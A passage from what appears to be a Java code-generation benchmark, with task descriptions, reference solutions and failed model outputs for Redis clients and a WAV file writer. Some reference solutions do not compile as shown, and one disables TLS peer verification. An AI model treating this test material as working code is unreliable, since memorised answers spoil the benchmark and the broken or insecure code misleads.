    "Canonical_solution": "import io.lettuce.core.ReadFrom;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.resource.ClientResources;\nimport io.lettuce.core.resource.DnsResolver;\nimport io.lettuce.core.resource.MappingSocketAddressResolver;\nimport io.lettuce.test.resource.FastShutdown;\n\npublic class RedisMasterReplicaConnector {\n\n    private final ClientResources clientResources;\n\n    public RedisMasterReplicaConnector(ClientResources clientResources) {\n        this.clientResources = clientResources.mutate()\n                .socketAddressResolver(MappingSocketAddressResolver.create(DnsResolver.jvmDefault(), hostAndPort -> {\n                    return HostAndPort.of(hostAndPort.getHostText(), hostAndPort.getPort() + 443);\n                })).build();\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> createConnection(String host, String masterId) {\n        RedisClient client = RedisClient.create(clientResources);\n        RedisURI redisURI = RedisURI.create(\"rediss-sentinel://\" + host + \":26379?sentinelMasterId=\" + masterId);\n        redisURI.setVerifyPeer(false);\n        \n        StatefulRedisMasterReplicaConnection<String, String> connection = \n            MasterReplica.connect(client, StringCodec.UTF8, redisURI);\n        connection.setReadFrom(ReadFrom.REPLICA);\n        \n        return connection;\n    }\n\n    public void closeConnection(StatefulRedisMasterReplicaConnection<String, String> connection) {\n        if (connection != null) {\n            connection.close();\n            FastShutdown.shutdown(connection.getRedisClient());\n        }\n    }\n\n    public void performOperations(StatefulRedisMasterReplicaConnection<String, String> connection, String key, String value) {\n        connection.sync().set(key, value);\n        connection.sync().get(key);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport io.lettuce.core.ClientResources;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.StatefulRedisMasterReplicaConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\n\npublic class RedisMasterReplicaConnector {\n    private final ClientResources clientResources;\n\n    public RedisMasterReplicaConnector(ClientResources clientResources) {\n        this.clientResources = clientResources;\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> createConnection(String host, String masterId) {\n        RedisURI redisUri = RedisURI.create(host);\n        redisUri.setMasterId(masterId);\n        RedisClient redisClient = RedisClient.create(clientResources, redisUri);\n        return redisClient.connectMasterReplica();\n    }\n\n    public void closeConnection(StatefulRedisMasterReplicaConnection<String, String> connection) {\n        if (connection != null) {\n            connection.close();\n        }\n    }\n\n    public void performOperations(StatefulRedisMasterReplicaConnection<String, String> connection, String key, String value) {\n        RedisCommands<String, String> syncCommands = connection.sync();\n        syncCommands.set(key, value);\n        String result = syncCommands.get(key);\n        System.out.println(\"Retrieved value: \" + result);\n    }\n}\n```"
  },
  {
    "Task_id": 34,
    "Instruction": "Task Description: Implement a Java class for writing WAV audio files with support for file rollover when reaching maximum size limits, using Java NIO's FileChannel for efficient file operations.\n\nClass Description: WaveWriter is a class that handles the creation and writing of WAV audio files. It manages file channels, buffers, and WAV file formatting while supporting automatic file rollover when files reach a specified maximum size. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- mAudioFormat: [AudioFormat] - The audio format specification for the WAV file\n- mFileRolloverCounter: [int] - Counter for tracking rolled-over file versions\n- mMaxSize: [long] - Maximum allowed file size before rollover (0 means no limit)\n- mFile: [Path] - Current file path being written to\n- mFileChannel: [FileChannel] - NIO file channel for file operations\n- mDataChunkOpen: [boolean] - Flag indicating if a data chunk is currently open\n- mDataChunkSizeOffset: [long] - File position of the data chunk size field\n- mDataChunkSize: [int] - Current size of the data chunk in bytes\n\nMethods:\n- WaveWriter: [constructor](AudioFormat format, Path file, long maxSize) -> [void] - Initializes a new WaveWriter with specified format, output file, and maximum size\n- WaveWriter: [constructor](AudioFormat format, Path file) -> [void] - Initializes a new WaveWriter with no maximum size limit\n- open: [private]() -> [void] - Opens a new file channel and writes initial WAV header\n- close: [public]() -> [void] - Closes the file channel and performs cleanup\n- close: [public](Path path) -> [void] - Closes the file channel and renames the file to the specified path\n- writeData: [public](ByteBuffer buffer) -> [void] - Writes audio data to the file, handling rollover if needed\n- closeDataChunk: [private]() -> [void] - Marks the current data chunk as closed\n- openDataChunk: [private]() -> [void] - Opens a new data chunk in the WAV file\n- rollover: [private]() -> [void] - Performs file rollover operation when reaching size limit\n- updateTotalSize: [private]() -> [void] - Updates the total file size in the WAV header\n- updateDataChunkSize: [private]() -> [void] - Updates the data chunk size in the WAV file\n- getUnsignedIntegerBuffer: [protected static](long size) -> [ByteBuffer] - Creates a buffer with unsigned integer representation\n- updateFileName: [private]() -> [void] - Updates the filename for rollover operations\n- getDataHeader: [public static]() -> [ByteBuffer] - Creates a data chunk header buffer\n- getWaveHeader: [public static](AudioFormat format) -> [ByteBuffer] - Creates a WAV file header buffer\n- getFormatChunk: [public static](AudioFormat format) -> [ByteBuffer] - Creates a format chunk buffer for WAV file",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.ByteOrder;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Arrays;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\nimport javax.sound.sampled.AudioFormat;\n\npublic class WaveWriter implements AutoCloseable\n{\n    private static final Pattern FILENAME_PATTERN = Pattern.compile(\"(.*_)(\\\\d+)(\\\\.tmp)\");\n    private AudioFormat mAudioFormat;\n    private int mFileRolloverCounter = 1;\n    private long mMaxSize;\n    private Path mFile;\n    private FileChannel mFileChannel;\n    private boolean mDataChunkOpen = false;\n    private long mDataChunkSizeOffset = 0;\n    private int mDataChunkSize = 0;\n\n    public WaveWriter(AudioFormat format, Path file, long maxSize) throws IOException\n    {\n        mAudioFormat = format;\n        mFile = file;\n        mMaxSize = maxSize;\n        open();\n    }\n\n    public WaveWriter(AudioFormat format, Path file) throws IOException\n    {\n        this(format, file, 0);\n    }\n\n    private void open() throws IOException\n    {\n        int version = 2;\n        while(Files.exists(mFile) && version < 20)\n        {\n            mFile = Paths.get(mFile.toFile().getAbsolutePath().replace(\".tmp\", \"_\" + version + \".tmp\"));\n            version++;\n        }\n        mFileChannel = (FileChannel.open(mFile, StandardOpenOption.WRITE, StandardOpenOption.CREATE_NEW));\n        ByteBuffer header = getWaveHeader(mAudioFormat);\n        while(header.hasRemaining())\n        {\n            mFileChannel.write(header);\n        }\n    }\n\n    public void close() throws IOException\n    {\n        close(null);\n    }\n\n    public void close(Path path) throws IOException\n    {\n        mFileChannel.force(true);\n        mFileChannel.close();\n        rename(path);\n    }\n\n    public void writeData(ByteBuffer buffer) throws IOException\n    {\n        buffer.position(0);\n        openDataChunk();\n        if(mFileChannel.size() + buffer.capacity() < mMaxSize)\n        {\n            while(buffer.hasRemaining())\n            {\n                mDataChunkSize += mFileChannel.write(buffer);\n            }\n            updateTotalSize();\n            updateDataChunkSize();\n        }\n        else\n        {\n            int remaining = (int)(mMaxSize - mFileChannel.size());\n            remaining -= (int)(remaining % mAudioFormat.getFrameSize());\n            byte[] bytes = buffer.array();\n            ByteBuffer current = ByteBuffer.wrap(Arrays.copyOf(bytes, remaining));\n            ByteBuffer next = ByteBuffer.wrap(Arrays.copyOfRange(bytes, remaining, bytes.length));\n            while(current.hasRemaining())\n            {\n                mDataChunkSize += mFileChannel.write(current);\n            }\n            updateTotalSize();\n            updateDataChunkSize();\n            rollover();\n            openDataChunk();\n            while(next.hasRemaining())\n            {\n                mDataChunkSize += mFileChannel.write(next);\n            }\n            updateTotalSize();\n            updateDataChunkSize();\n        }\n    }\n\n    private void closeDataChunk()\n    {\n        mDataChunkOpen = false;\n    }\n\n    private void openDataChunk() throws IOException\n    {\n        if(!mDataChunkOpen)\n        {\n            if(mFileChannel.size() + 32 >= mMaxSize)\n            {\n                rollover();\n            }\n            ByteBuffer formatChunk = getFormatChunk(mAudioFormat);\n            formatChunk.position(0);\n            while(formatChunk.hasRemaining())\n            {\n                mFileChannel.write(formatChunk);\n            }\n            ByteBuffer dataHeader = getDataHeader();\n            dataHeader.position(0);\n            while(dataHeader.hasRemaining())\n            {\n                mFileChannel.write(dataHeader);\n            }\n            mDataChunkSizeOffset = mFileChannel.size() - 4;\n            mDataChunkSize = 0;\n            mDataChunkOpen = true;\n            updateTotalSize();\n        }\n    }\n\n    private void rollover() throws IOException\n    {\n        closeDataChunk();\n        close();\n        mFileRolloverCounter++;\n        updateFileName();\n        open();\n    }\n\n    private void updateTotalSize() throws IOException\n    {\n        ByteBuffer buffer = getUnsignedIntegerBuffer(mFileChannel.size() - 8);\n        mFileChannel.write(buffer, 4);\n    }\n\n    private void updateDataChunkSize() throws IOException\n    {\n        ByteBuffer size = getUnsignedIntegerBuffer(mDataChunkSize);\n        mFileChannel.write(size, mDataChunkSizeOffset);\n    }\n\n    protected static ByteBuffer getUnsignedIntegerBuffer(long size)\n    {\n        ByteBuffer buffer = ByteBuffer.allocate(4);\n        buffer.put((byte)(size & 0xFFl));\n        buffer.put((byte)(Long.rotateRight(size & 0xFF00l, 8)));\n        buffer.put((byte)(Long.rotateRight(size & 0xFF0000l, 16)));\n        buffer.put((byte)Long.rotateRight(Long.rotateRight(size & 0xFF000000l, 16), 8));\n        buffer.position(0);\n        return buffer;\n    }\n\n    private void updateFileName()\n    {\n        String filename = mFile.toString();\n        if(mFileRolloverCounter == 2)\n        {\n            filename = filename.replace(\".tmp\", \"_2.tmp\");\n        }\n        else\n        {\n            Matcher m = FILENAME_PATTERN.matcher(filename);\n            if(m.find())\n            {\n                StringBuilder sb = new StringBuilder();\n                sb.append(m.group(1));\n                sb.append(mFileRolloverCounter);\n                sb.append(m.group(3));\n                filename = sb.toString();\n            }\n        }\n        mFile = Paths.get(filename);\n    }\n\n    public static ByteBuffer getDataHeader()\n    {\n        ByteBuffer header = ByteBuffer.allocate(8);\n        header.put(DATA_CHUNK_ID.getBytes());\n        header.position(0);\n        return header;\n    }\n\n    public static ByteBuffer getWaveHeader(AudioFormat format)\n    {\n        ByteBuffer header = ByteBuffer.allocate(12).order(ByteOrder.LITTLE_ENDIAN);\n        header.put(RIFF_ID.getBytes());\n        header.putInt(INITIAL_TOTAL_LENGTH);\n        header.put(WAVE_ID.getBytes());\n        header.position(0);\n        return header;\n    }\n\n    public static ByteBuffer getFormatChunk(AudioFormat format)\n    {\n        ByteBuffer header = ByteBuffer.allocate(24).order(ByteOrder.LITTLE_ENDIAN);\n        header.put(FORMAT_CHUNK_ID.getBytes());\n        header.putInt(FORMAT_CHUNK_LENGTH);\n        header.putShort(FORMAT_UNCOMPRESSED_PCM);\n        header.putShort((short)format.getChannels());\n        header.putInt((int)format.getSampleRate());\n        int frameByteRate = format.getChannels() * format.getSampleSizeInBits() / 8;\n        int byteRate = (int)(format.getSampleRate() * frameByteRate);\n        header.putInt(byteRate);\n        header.putShort((short)frameByteRate);\n        header.putShort((short)format.getSampleSizeInBits());\n        header.position(0);\n        return header;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class WaveWriter implements AutoCloseable {\n    private AudioFormat mAudioFormat;\n    private int mFileRolloverCounter;\n    private long mMaxSize;\n    private Path mFile;\n    private FileChannel mFileChannel;\n    private boolean mDataChunkOpen;\n    private long mDataChunkSizeOffset;\n    private int mDataChunkSize;\n\n    public WaveWriter(AudioFormat format, Path file, long maxSize) {\n        mAudioFormat = format;\n        mFile = file;\n        mMaxSize = maxSize;\n        mFileRolloverCounter = 0;\n        open();\n    }\n\n    public WaveWriter(AudioFormat format, Path file) {\n        this(format, file, 0);\n    }\n\n    private void open() {\n        try {\n            mFileChannel = FileChannel.open(mFile, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);\n            writeWaveHeader();\n            openDataChunk();\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to open WaveWriter\", e);\n        }\n    }\n\n    @Override\n    public void close() {\n        close(null);\n    }\n\n    public void close(Path path) {\n        try {\n            if (mDataChunkOpen) {\n                closeDataChunk();\n            }\n            if (mFileChannel != null) {\n                mFileChannel.close();\n            }\n            if (path != null) {\n                Files.move(mFile, path, StandardCopyOption.REPLACE_EXISTING);\n            }\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to close WaveWriter\", e);\n        }\n    }\n\n    public void writeData(ByteBuffer buffer) {\n        try {\n            if (mMaxSize > 0 && mFileChannel.size() + buffer.remaining() > mMaxSize) {\n                rollover();\n            }\n            mFileChannel.write(buffer);\n            mDataChunkSize += buffer.remaining();\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to write data to WaveWriter\", e);\n        }\n    }\n\n    private void closeDataChunk() {\n        if (mDataChunkOpen) {\n            updateDataChunkSize();\n            mDataChunkOpen = false;\n        }\n    }\n\n    private void openDataChunk() {\n        if (!mDataChunkOpen) {\n            mDataChunkOpen = true;\n            mDataChunkSize = 0;\n            mDataChunkSizeOffset = mFileChannel.position();\n            mFileChannel.position(mFileChannel.position() + 4); // Skip data chunk size\n        }\n    }\n\n    private void rollover() {\n        closeDataChunk();\n        updateTotalSize();\n        mFileRolloverCounter++;\n        updateFileName();\n        open();\n    }\n\n    private void updateTotalSize() {\n        try {\n            mFileChannel.position(4); // Skip RIFF header\n            ByteBuffer sizeBuffer = getUnsignedIntegerBuffer(mFileChannel.size() - 8);\n            mFileChannel.write(sizeBuffer);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to update total size in WaveWriter\", e);\n        }\n    }\n\n    private void updateDataChunkSize() {\n        try {\n            mFileChannel.position(mDataChunkSizeOffset);\n            ByteBuffer sizeBuffer = getUnsignedIntegerBuffer(mDataChunkSize);\n            mFileChannel.write(sizeBuffer);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to update data chunk size in WaveWriter\", e);\n        }\n    }\n\n    protected static ByteBuffer getUnsignedIntegerBuffer(long size) {\n        ByteBuffer buffer = ByteBuffer.allocate(4);\n        buffer.order(ByteOrder.LITTLE_ENDIAN);\n        buffer.putInt((int) size);\n        buffer.flip();\n        return buffer;\n    }\n\n    private void updateFileName() {\n        String baseName = mFile.getFileName().toString();\n        int dotIndex = baseName.lastIndexOf('.');\n        String extension = \"\";\n        if (dotIndex != -1) {\n            extension = baseName.substring(dotIndex);\n            baseName = baseName.substring(0, dotIndex);\n        }\n        mFile = mFile.getParent().resolve(baseName + \"_\" + mFileRolloverCounter + extension);\n    }\n\n    public static ByteBuffer getDataHeader() {\n        ByteBuffer buffer = ByteBuffer.allocate(8);\n        buffer.order(ByteOrder.LITTLE_ENDIAN);\n        buffer.put(\"data\".getBytes());\n        buffer.putInt(0);\n        buffer.flip();\n        return buffer;\n    }\n\n    public static ByteBuffer getWaveHeader(AudioFormat format) {\n        ByteBuffer buffer = ByteBuffer.allocate(44);\n        buffer.order(ByteOrder.LITTLE_ENDIAN);\n        buffer.put(\"RIFF\".getBytes());\n        buffer.putInt(0); // Placeholder for file size\n        buffer.put(\"WAVE\".getBytes());\n        buffer.put(\"fmt \".getBytes());\n        buffer.putInt(16); // Format chunk size\n        buffer.putShort((short) 1); // Audio format (PCM)\n        buffer.putShort((short) format.channels);\n        buffer.putInt(format.sampleRate);\n        buffer.putInt(format.sampleRate * format.channels * format.bitsPerSample / 8);\n        buffer.putShort((short) (format.channels * format.bitsPerSample / 8));\n        buffer.putShort((short) format.bitsPerSample);\n        buffer.put(\"data\".getBytes());\n        buffer.putInt(0); // Placeholder for data chunk size\n        buffer.flip();\n        return buffer;\n    }\n\n    public static ByteBuffer getFormatChunk(AudioFormat format) {\n        ByteBuffer buffer = ByteBuffer.allocate(16);\n        buffer.order(ByteOrder.LITTLE_ENDIAN);\n        buffer.putShort((short) 1); // Audio format (PCM)\n        buffer.putShort((short) format.channels);\n        buffer.putInt(format.sampleRate);\n        buffer.putInt(format.sampleRate * format.channels * format.bitsPerSample / 8);\n        buffer.putShort((short) (format.channels * format.bitsPerSample / 8));\n        buffer.putShort((short) format.bitsPerSample);\n        buffer.flip();\n        return buffer;\n    }\n\n    private void writeWaveHeader() {\n        try {\n            ByteBuffer header = getWaveHeader(mAudioFormat);\n            mFileChannel.write(header);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to write wave header\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 342,
    "Instruction": "Task Description: Create a Redis connection factory class in Java that handles both standalone Redis instances and Redis clusters, with support for connection pooling and sentinel configurations.\n\nClass Description: The RedisConnectionFactory class provides a centralized way to create and manage Redis connections (both standalone and cluster) with configurable connection parameters. It handles connection pooling, authentication, and resource cleanup.\n\nAttributes:\n- hostName: String - The Redis server hostname (default: \"localhost\")\n- port: int - The Redis server port (default: 6379)\n- timeout: int - Connection timeout in milliseconds (default: 2000)\n- password: String - Password for Redis authentication\n- sentinelMaster: String - Name of the Redis sentinel master\n- redisServers: List<RedisNode> - List of Redis server nodes for cluster/sentinel configuration\n- isCluster: boolean - Flag indicating whether to use Redis cluster mode\n- dbIndex: int - Redis database index to select (default: 0)\n- shardInfo: JedisShardInfo - Redis connection shard information\n- pool: Pool<Jedis> - Jedis connection pool instance\n- cluster: JedisCluster - Jedis cluster instance\n- poolConfig: JedisPoolConfig - Configuration for the connection pool\n\nMethods:\n- init(): void - Initializes the Redis connection factory by creating either a connection pool or cluster instance\n- destroy(): void - Cleans up resources by closing all active connections and pools\n- fetchJedisConnector(): Jedis - Internal method to fetch a Jedis connection from pool or create a new one\n- createPool(): Pool<Jedis> - Creates a Redis connection pool (either regular or sentinel)\n- createRedisSentinelPool(): Pool<Jedis> - Creates a Redis sentinel connection pool\n- createRedisPool(): Pool<Jedis> - Creates a regular Redis connection pool\n- createCluster(): JedisCluster - Creates a Redis cluster connection\n- getJedisConnection(): Jedis - Returns a configured Jedis connection\n- getClusterConnection(): JedisCluster - Returns the Jedis cluster instance",
    "Canonical_solution": "import com.mpush.cache.redis.RedisServer;\nimport com.mpush.tools.config.data.RedisNode;\nimport org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.*;\nimport redis.clients.util.Pool;\n\nimport java.util.List;\nimport java.util.Objects;\nimport java.util.Set;\nimport java.util.stream.Collectors;\n\npublic class RedisConnectionFactory {\n\n    private final static Logger log = LoggerFactory.getLogger(RedisConnectionFactory.class);\n\n    private String hostName = \"localhost\";\n    private int port = Protocol.DEFAULT_PORT;\n    private int timeout = Protocol.DEFAULT_TIMEOUT;\n    private String password;\n    private String sentinelMaster;\n    private List<RedisNode> redisServers;\n    private boolean isCluster = false;\n    private int dbIndex = 0;\n    private JedisShardInfo shardInfo;\n    private Pool<Jedis> pool;\n    private JedisCluster cluster;\n    private JedisPoolConfig poolConfig = new JedisPoolConfig();\n\n    public RedisConnectionFactory() {\n    }\n\n    protected Jedis fetchJedisConnector() {\n        try {\n            if (pool != null) {\n                return pool.getResource();\n            }\n            Jedis jedis = new Jedis(getShardInfo());\n            jedis.connect();\n            return jedis;\n        } catch (Exception ex) {\n            throw new RuntimeException(\"Cannot get Jedis connection\", ex);\n        }\n    }\n\n    public void init() {\n        if (shardInfo == null) {\n            shardInfo = new JedisShardInfo(hostName, port);\n            if (StringUtils.isNotEmpty(password)) {\n                shardInfo.setPassword(password);\n            }\n            if (timeout > 0) {\n                shardInfo.setConnectionTimeout(timeout);\n            }\n        }\n\n        if (isCluster) {\n            this.cluster = createCluster();\n        } else {\n            this.pool = createPool();\n        }\n    }\n\n    private Pool<Jedis> createPool() {\n        if (StringUtils.isNotBlank(sentinelMaster)) {\n            return createRedisSentinelPool();\n        }\n        return createRedisPool();\n    }\n\n    protected Pool<Jedis> createRedisSentinelPool() {\n        Set<String> hostAndPorts = redisServers\n                .stream()\n                .map(redisNode -> new HostAndPort(redisNode.host, redisNode.port).toString())\n                .collect(Collectors.toSet());\n        return new JedisSentinelPool(sentinelMaster, hostAndPorts, poolConfig, getShardInfo().getSoTimeout(), getShardInfo().getPassword());\n    }\n\n    protected Pool<Jedis> createRedisPool() {\n        return new JedisPool(getPoolConfig(), shardInfo.getHost(), shardInfo.getPort(), shardInfo.getSoTimeout(), shardInfo.getPassword());\n    }\n\n    protected JedisCluster createCluster() {\n        Set<HostAndPort> hostAndPorts = redisServers\n                .stream()\n                .map(redisNode -> new HostAndPort(redisNode.host, redisNode.port))\n                .collect(Collectors.toSet());\n        if (StringUtils.isNotEmpty(getPassword())) {\n            throw new IllegalArgumentException(\"Jedis does not support password protected Redis Cluster configurations!\");\n        }\n        int redirects = 5;\n        return new JedisCluster(hostAndPorts, timeout, redirects, poolConfig);\n    }\n\n    public void destroy() {\n        if (pool != null) {\n            try {\n                pool.destroy();\n            } catch (Exception ex) {\n                log.warn(\"Cannot properly close Jedis pool\", ex);\n            }\n            pool = null;\n        }\n        if (cluster != null) {\n            try {\n                cluster.close();\n            } catch (Exception ex) {\n                log.warn(\"Cannot properly close Jedis cluster\", ex);\n            }\n            cluster = null;\n        }\n    }\n\n    public Jedis getJedisConnection() {\n        Jedis jedis = fetchJedisConnector();\n        if (dbIndex > 0 && jedis != null) {\n            jedis.select(dbIndex);\n        }\n        return jedis;\n    }\n\n    public JedisCluster getClusterConnection() {\n        return cluster;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport java.util.*;\n\npublic class RedisConnectionFactory {\n    private String hostName = \"localhost\";\n    private int port = 6379;\n    private int timeout = 2000;\n    private String password;\n    private String sentinelMaster;\n    private List<RedisNode> redisServers;\n    private boolean isCluster;\n    private int dbIndex = 0;\n    private JedisShardInfo shardInfo;\n    private Pool<Jedis> pool;\n    private JedisCluster cluster;\n    private JedisPoolConfig poolConfig;\n\n    public RedisConnectionFactory() {\n        this.poolConfig = new JedisPoolConfig();\n    }\n\n    public void init() {\n        if (isCluster) {\n            createCluster();\n        } else {\n            createPool();\n        }\n    }\n\n    public void destroy() {\n        if (pool != null) {\n            try {\n                pool.close();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        if (cluster != null) {\n            cluster.close();\n        }\n    }\n\n    private Jedis fetchJedisConnector() {\n        if (isCluster) {\n            return cluster.getResource();\n        } else {\n            return pool.getResource();\n        }\n    }\n\n    private Pool<Jedis> createPool() {\n        if (redisServers != null && !redisServers.isEmpty()) {\n            List<JedisShardInfo> shards = new ArrayList<>();\n            for (RedisNode node : redisServers) {\n                JedisShardInfo shard = new JedisShardInfo(node.getHost(), node.getPort(), timeout);\n                shard.setPassword(password);\n                shard.setDb(dbIndex);\n                shards.add(shard);\n            }\n            pool = new JedisPool(poolConfig, shards);\n        } else {\n            shardInfo = new JedisShardInfo(hostName, port, timeout);\n            shardInfo.setPassword(password);\n            shardInfo.setDb(dbIndex);\n            pool = new JedisPool(poolConfig, shardInfo);\n        }\n        return pool;\n    }\n\n    private Pool<Jedis> createRedisSentinelPool() {\n        Set<HostAndPort> nodes = new HashSet<>();\n        for (RedisNode node : redisServers) {\n            nodes.add(new HostAndPort(node.getHost(), node.getPort()));\n        }\n        JedisSentinelPool sentinelPool = new JedisSentinelPool(sentinelMaster, nodes, poolConfig, timeout, password, dbIndex);\n        pool = sentinelPool;\n        return pool;\n    }\n\n    private Pool<Jedis> createRedisPool() {\n        shardInfo = new JedisShardInfo(hostName, port, timeout);\n        shardInfo.setPassword(password);\n        shardInfo.setDb(dbIndex);\n        pool = new JedisPool(poolConfig, shardInfo);\n        return pool;\n    }\n\n    private JedisCluster createCluster() {\n        Set<HostAndPort> nodes = new HashSet<>();\n        for (RedisNode node : redisServers) {\n            nodes.add(new HostAndPort(node.getHost(), node.getPort()));\n        }\n        cluster = new JedisCluster(nodes, timeout, timeout, 5, password, dbIndex);\n        return cluster;\n    }\n\n    public Jedis getJedisConnection() {\n        return fetchJedisConnector();\n    }\n\n    public JedisCluster getClusterConnection() {\n        return cluster;\n    }\n\n    // Setter methods\n    public void setHostName(String hostName) {\n        this.hostName = hostName;\n    }\n\n    public void setPort(int port) {\n        this.port = port;\n    }\n\n    public void setTimeout(int timeout) {\n        this.timeout = timeout;\n    }\n\n    public void setPassword(String password) {\n        this.password = password;\n    }\n\n    public void setSentinelMaster(String sentinelMaster) {\n        this.sentinelMaster = sentinelMaster;\n    }\n\n    public void setRedisServers(List<RedisNode> redisServers) {\n        this.redisServers = redisServers;\n    }\n\n    public void setIsCluster(boolean isCluster) {\n        this.isCluster = isCluster;\n    }\n\n    public void setDbIndex(int dbIndex) {\n        this.dbIndex = dbIndex;\n    }\n\n    public void setPoolConfig(JedisPoolConfig poolConfig) {\n        this.poolConfig = poolConfig;\n    }\n\n    // Inner class for RedisNode\n    public static class RedisNode {\n        private String host;\n        private int port;\n\n        public RedisNode(String host, int port) {\n            this.host = host;\n            this.port = port;\n        }\n\n        public String getHost() {\n            return host;\n        }\n\n        public int getPort() {\n            return port;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 345,
    "Instruction": "Task Description: Implement a Redis sharding client in Java that distributes keys across multiple Redis instances using consistent hashing, with support for basic CRUD operations and command execution.\n\nClass Description: JedisSharding is a Redis client wrapper that implements sharding across multiple Redis instances. It uses consistent hashing to distribute keys and automatically manages connections to the appropriate shard for each operation.\n\nAttributes:\n- shards: List<HostAndPort> - List of Redis server addresses and ports for sharding\n- clientConfig: JedisClientConfig - Configuration for Redis client connections\n- hashing: Hashing - Hashing algorithm used for key distribution (defaults to MURMUR_HASH)\n\nMethods:\n- JedisSharding(List<HostAndPort>, JedisClientConfig) -> void - Constructor with default hashing algorithm\n- JedisSharding(List<HostAndPort>, JedisClientConfig, Hashing) -> void - Constructor with custom hashing algorithm\n- set(String, String) -> String - Stores a key-value pair in the appropriate shard\n- get(String) -> String - Retrieves a value from the appropriate shard\n- sendCommand(String, Protocol.Command, String...) -> Object - Sends a raw Redis command to the appropriate shard\n- close() -> void - Cleans up resources (no-op as connections are managed per-operation)\n- getShard(String) -> Jedis - Internal method to get a connection to the correct shard\n- getShardIndex(String) -> int - Internal method to calculate shard index for a key",
    "Canonical_solution": "import redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.util.Hashing;\nimport java.util.List;\n\npublic class JedisSharding implements AutoCloseable {\n\n    private final List<HostAndPort> shards;\n    private final JedisClientConfig clientConfig;\n    private final Hashing hashing;\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig) {\n        this(shards, clientConfig, Hashing.MURMUR_HASH);\n    }\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig, Hashing hashing) {\n        this.shards = shards;\n        this.clientConfig = clientConfig;\n        this.hashing = hashing;\n    }\n\n    public String set(String key, String value) {\n        try (Jedis jedis = getShard(key)) {\n            return jedis.set(key, value);\n        }\n    }\n\n    public String get(String key) {\n        try (Jedis jedis = getShard(key)) {\n            return jedis.get(key);\n        }\n    }\n\n    public Object sendCommand(String key, Protocol.Command command, String... args) {\n        try (Jedis jedis = getShard(key)) {\n            return jedis.sendCommand(command, args);\n        }\n    }\n\n    private Jedis getShard(String key) {\n        int shardIndex = getShardIndex(key);\n        HostAndPort shard = shards.get(shardIndex);\n        Jedis jedis = new Jedis(shard, clientConfig);\n        if (shard.getPassword() != null) {\n            jedis.auth(shard.getPassword());\n        }\n        return jedis;\n    }\n\n    private int getShardIndex(String key) {\n        long hash = hashing.hash(key);\n        return (int) (hash % shards.size());\n    }\n\n    @Override\n    public void close() {\n        // Connection cleanup handled by try-with-resources in individual operations\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Protocol;\nimport redis.clients.jedis.util.Hashing;\n\nimport java.util.List;\n\npublic class JedisSharding {\n    private final List<HostAndPort> shards;\n    private final JedisClientConfig clientConfig;\n    private final Hashing hashing;\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig) {\n        this.shards = shards;\n        this.clientConfig = clientConfig;\n        this.hashing = Hashing.MURMUR_HASH;\n    }\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig, Hashing hashing) {\n        this.shards = shards;\n        this.clientConfig = clientConfig;\n        this.hashing = hashing;\n    }\n\n    public String set(String key, String value) {\n        Jedis jedis = getShard(key);\n        try {\n            return jedis.set(key, value);\n        } finally {\n            jedis.close();\n        }\n    }\n\n    public String get(String key) {\n        Jedis jedis = getShard(key);\n        try {\n            return jedis.get(key);\n        } finally {\n            jedis.close();\n        }\n    }\n\n    public Object sendCommand(String key, Protocol.Command command, String... args) {\n        Jedis jedis = getShard(key);\n        try {\n            return jedis.sendCommand(command, args);\n        } finally {\n            jedis.close();\n        }\n    }\n\n    public void close() {\n        // No-op as connections are managed per-operation\n    }\n\n    private Jedis getShard(String key) {\n        int index = getShardIndex(key);\n        HostAndPort hostAndPort = shards.get(index);\n        return new Jedis(hostAndPort.getHost(), hostAndPort.getPort(), clientConfig);\n    }\n\n    private int getShardIndex(String key) {\n        return Math.abs(hashing.hash(key)) % shards.size();\n    }\n}\n```"
  },
  {
    "Task_id": 349,
